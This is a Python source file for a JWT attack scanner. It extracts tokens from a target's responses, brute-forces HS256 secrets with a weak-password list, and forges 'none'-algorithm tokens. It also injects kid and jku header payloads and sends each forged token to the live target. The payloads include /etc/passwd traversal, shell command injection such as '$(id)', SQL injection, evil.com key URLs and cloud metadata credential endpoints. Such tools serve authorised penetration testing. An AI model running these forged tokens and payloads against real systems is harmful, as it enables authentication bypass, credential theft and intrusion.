#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import hashlib
import hmac
import json
import random
import re
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

from core.logger import (log_debug, log_error, log_info, log_success,
                         log_warning)
from modules.core.http_client import HTTPClient
from modules.core.payload_manager import PayloadManager


class JWTScanner:
    """
    Advanced JWT (JSON Web Token) Security Scanner
    Supports: Token Extraction, Header Analysis, Payload Inspection,
              Algorithm Detection, Weak Secret Testing, None Algorithm Attack,
              Kid Injection, JKU Injection, JWKS Spoofing
    Combined Power: Internal Payloads (100+) + Payload Manager Integration
    """

    def __init__(self, target: str, verbose: bool = False):
        self.target = target.rstrip("/")
        self.verbose = verbose
        self.client = HTTPClient(timeout=30, retries=5, verbose=verbose)
        self.payload_manager = PayloadManager(verbose=verbose)
        self.results = []
        self.tokens = []
        self.vulnerabilities = []

        # JWT detection patterns
        self.jwt_patterns = [
            r"eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+",
            r"Bearer\s+([a-zA-Z0-9\-_]+?\.[a-zA-Z0-9\-_]+?\.[a-zA-Z0-9\-_]+)",
            r'["\']token["\']\s*[:=]\s*["\']([^"\']+)["\']',
            r'["\']jwt["\']\s*[:=]\s*["\']([^"\']+)["\']',
            r'["\']access_token["\']\s*[:=]\s*["\']([^"\']+)["\']',
            r'["\']id_token["\']\s*[:=]\s*["\']([^"\']+)["\']',
            r'["\']refresh_token["\']\s*[:=]\s*["\']([^"\']+)["\']',
        ]

        # Common weak secrets for JWT cracking
        self.weak_secrets = [
            "secret",
            "password",
            "123456",
            "admin",
            "jwt",
            "key",
            "token",
            "abc123",
            "qwerty",
            "letmein",
            "monkey",
            "dragon",
            "baseball",
            "master",
            "sunshine",
            "iloveyou",
            "trustno1",
            "1234567",
            "password1",
            "12345678",
            "123456789",
            "1234567890",
            "admin123",
            "root123",
            "user123",
            "test123",
            "demo123",
            "dev123",
            "staging123",
            "prod123",
            "changeme",
            "welcome",
            "hello",
            "password123",
            "admin1234",
            "root1234",
            "user1234",
            "test1234",
            "secret123",
            "jwt123",
            "token123",
            "key123",
            "auth123",
        ]

        # Common kid values for injection
        self.kid_payloads = [
            "../../../etc/passwd",
            "/etc/passwd",
            "file:///etc/passwd",
            "|id",
            ";id",
            "&id",
            "`id`",
            "$(id)",
            "1' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "http://evil.com/key",
            "https://evil.com/key",
            "//evil.com/key",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        ]

        # Common JKU payloads (JWKS URL manipulation)
        self.jku_payloads = [
            "http://evil.com/jwks.json",
            "https://evil.com/jwks.json",
            "//evil.com/jwks.json",
            "http://127.0.0.1/jwks.json",
            "http://169.254.169.254/jwks.json",
            "http://metadata.google.internal/jwks.json",
            "https://raw.githubusercontent.com/evil/jwks.json",
            "gopher://evil.com/_GET%20/jwks.json",
        ]

        # ---------- INTERNAL PAYLOADS ----------
        self.internal_payloads = self._load_internal_payloads()
        self.manager_payloads = self._load_manager_payloads()
        self.all_payloads = list(set(self.internal_payloads + self.manager_payloads))

    def _load_internal_payloads(self) -> List[str]:
        """Internal payloads for JWT testing"""
        payloads = []

        # ----- JWT TOKENS FOR TESTING -----
        test_tokens = [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        ]
        payloads.extend(test_tokens)

        # ----- MALFORMED TOKENS -----
        malformed = [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ..",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.xxx",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        ]
        payloads.extend(malformed)

        return list(set(payloads))

    def _load_manager_payloads(self) -> List[str]:
        """Load payloads from Payload Manager"""
        payloads = []
        tags = ["jwt", "token", "malformed", "weak"]
        for tag in tags:
            results = self.payload_manager.get_payloads("jwt", tags=[tag], limit=50)
            for p in results:
                if "value" in p:
                    payloads.append(p["value"])
        return list(set(payloads))

    def _decode_jwt(self, token: str) -> Optional[Tuple[Dict, Dict, str]]:
        """Decode JWT without verification"""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None

            header = json.loads(
                base64.urlsafe_b64decode(parts[0] + "==").decode("utf-8")
            )
            payload = json.loads(
                base64.urlsafe_b64decode(parts[1] + "==").decode("utf-8")
            )
            signature = parts[2]

            return header, payload, signature
        except Exception as e:
            if self.verbose:
                log_debug(f"JWT decode error: {e}")
            return None

    def _test_weak_secret(self, token: str, header: Dict, payload: Dict) -> bool:
        """Test JWT with weak secrets"""
        if header.get("alg") != "HS256":
            return False

        for secret in self.weak_secrets:
            try:
                # Reconstruct JWT with secret
                parts = token.split(".")
                header_encoded = parts[0]
                payload_encoded = parts[1]
                signature = parts[2]

                # Compute signature with secret
                message = f"{header_encoded}.{payload_encoded}".encode()
                computed_sig = (
                    base64.urlsafe_b64encode(
                        hmac.new(secret.encode(), message, hashlib.sha256).digest()
                    )
                    .decode("utf-8")
                    .rstrip("=")
                )

                if computed_sig == signature:
                    self.vulnerabilities.append(
                        {
                            "type": "weak_secret",
                            "secret": secret,
                            "token": token[:50] + "...",
                            "header": header,
                            "payload": payload,
                        }
                    )
                    log_success(f"Weak JWT secret found: {secret}")
                    return True
            except Exception as e:
                if self.verbose:
                    log_debug(f"Secret test error for {secret}: {e}")

        return False

    def _test_none_algorithm(self, token: str, header: Dict, payload: Dict) -> bool:
        """Test None algorithm attack"""
        if header.get("alg") != "none":
            # Try to create a new token with none algorithm
            try:
                new_header = header.copy()
                new_header["alg"] = "none"
                new_header_encoded = (
                    base64.urlsafe_b64encode(json.dumps(new_header).encode())
                    .decode("utf-8")
                    .rstrip("=")
                )

                payload_encoded = token.split(".")[1]
                new_token = f"{new_header_encoded}.{payload_encoded}."

                # Send the token to see if it's accepted
                test_url = self.target
                headers = {"Authorization": f"Bearer {new_token}"}
                resp = self.client.get(test_url, headers=headers)

                if resp and resp.status_code != 401:
                    self.vulnerabilities.append(
                        {
                            "type": "none_algorithm",
                            "token": new_token[:50] + "...",
                            "header": new_header,
                            "payload": payload,
                        }
                    )
                    log_success("None algorithm attack successful!")
                    return True
            except Exception as e:
                if self.verbose:
                    log_debug(f"None algorithm test error: {e}")

        return False

    def _test_kid_injection(self, token: str, header: Dict, payload: Dict) -> bool:
        """Test Key ID injection"""
        if "kid" not in header:
            return False

        for kid_payload in self.kid_payloads:
            try:
                new_header = header.copy()
                new_header["kid"] = kid_payload
                new_header_encoded = (
                    base64.urlsafe_b64encode(json.dumps(new_header).encode())
                    .decode("utf-8")
                    .rstrip("=")
                )

                payload_encoded = token.split(".")[1]
                signature = token.split(".")[2]
                new_token = f"{new_header_encoded}.{payload_encoded}.{signature}"

                # Send the token
                test_url = self.target
                headers = {"Authorization": f"Bearer {new_token}"}
                resp = self.client.get(test_url, headers=headers)

                if resp and resp.status_code != 401:
                    self.vulnerabilities.append(
                        {
                            "type": "kid_injection",
                            "payload": kid_payload,
                            "token": new_token[:50] + "...",
                            "header": new_header,
                        }
                    )
                    log_success(f"Kid injection successful with: {kid_payload}")
                    return True
            except Exception as e:
                if self.verbose:
                    log_debug(f"Kid test error: {e}")

        return False

    def _test_jku_injection(self, token: str, header: Dict, payload: Dict) -> bool:
        """Test JKU (JWKS URL) injection"""
        if "jku" not in header:
            return False

        for jku_payload in self.jku_payloads:
            try:
                new_header = header.copy()
                new_header["jku"] = jku_payload
                new_header_encoded = (
                    base64.urlsafe_b64encode(json.dumps(new_header).encode())
                    .decode("utf-8")
                    .rstrip("=")
                )

                payload_encoded = token.split(".")[1]
                signature = token.split(".")[2]
                new_token = f"{new_header_encoded}.{payload_encoded}.{signature}"

                # Send the token
                test_url = self.target
                headers = {"Authorization": f"Bearer {new_token}"}
                resp = self.client.get(test_url, headers=headers)

                if resp and resp.status_code != 401:
                    self.vulnerabilities.append(
                        {
                            "type": "jku_injection",
                            "payload": jku_payload,
                            "token": new_token[:50] + "...",
                            "header": new_header,
                        }
                    )
                    log_success(f"JKU injection successful with: {jku_payload}")
                    return True
            except Exception as e:
                if self.verbose:
                    log_debug(f"JKU test error: {e}")

        return False

    def extract_tokens(self, content: str) -> List[str]:
        """Extract JWT tokens from text content"""
        tokens = []
        for pattern in self.jwt_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0]
                if match and len(match) > 20:
                    tokens.append(match)
        return list(set(tokens))

    def scan_token(self, token: str) -> Dict:
        """Scan a single JWT token"""
        result = {
            "token": token[:50] + "...",
            "full_token": token,
            "vulnerabilities": [],
        }

        decoded = self._decode_jwt(token)
        if not decoded:
            result["error"] = "Invalid JWT format"
            return result

        header, payload, signature = decoded
        result["header"] = header
        result["payload"] = payload
        result["signature"] = signature[:20] + "..."

        # Check algorithm
        alg = header.get("alg", "unknown")
        result["algorithm"] = alg

        if alg == "none":
            self.vulnerabilities.append(
                {
                    "type": "none_algorithm_detected",
                    "token": token[:50] + "...",
                    "header": header,
                }
            )
            log_warning(f"JWT with none algorithm detected!")

        if alg == "HS256":
            if self._test_weak_secret(token, header, payload):
                result["vulnerabilities"].append("weak_secret")

        # Test attacks
        self._test_none_algorithm(token, header, payload)
        self._test_kid_injection(token, header, payload)
        self._test_jku_injection(token, header, payload)

        # Check for sensitive data in payload
        sensitive_fields = [
            "password",
            "secret",
            "key",
            "token",
            "api_key",
            "private",
            "credit_card",
            "cvv",
        ]
        for field in sensitive_fields:
            if field in payload:
                result["sensitive_data"] = True
                log_warning(f"Sensitive data found in JWT payload: {field}")

        return result

    def run(self) -> Dict:
        log_info(f"Starting JWT scan on: {self.target}")

        # Fetch target content
        resp = self.client.get(self.target)
        if not resp:
            log_error("Failed to fetch target")
            return {
                "target": self.target,
                "scan_type": "jwt",
                "tokens": [],
                "vulnerabilities": [],
            }

        # Extract tokens from response
        content = resp.text
        tokens = self.extract_tokens(content)

        # Also check cookies
        if hasattr(resp, "cookies"):
            for cookie in resp.cookies:
                tokens.extend(self.extract_tokens(cookie.value))

        # Check headers
        for header_name, header_value in resp.headers.items():
            tokens.extend(self.extract_tokens(header_value))

        tokens = list(set(tokens))
        self.tokens = tokens

        log_info(f"Found {len(tokens)} JWT tokens")

        # Scan each token
        for token in tokens:
            result = self.scan_token(token)
            self.results.append(result)

        # Summary
        log_success(
            f"JWT scan completed. Found {len(tokens)} tokens, {len(self.vulnerabilities)} vulnerabilities."
        )
        return {
            "target": self.target,
            "scan_type": "jwt",
            "total_tokens": len(tokens),
            "vulnerabilities_count": len(self.vulnerabilities),
            "tokens": self.results,
            "vulnerabilities": self.vulnerabilities,
        }
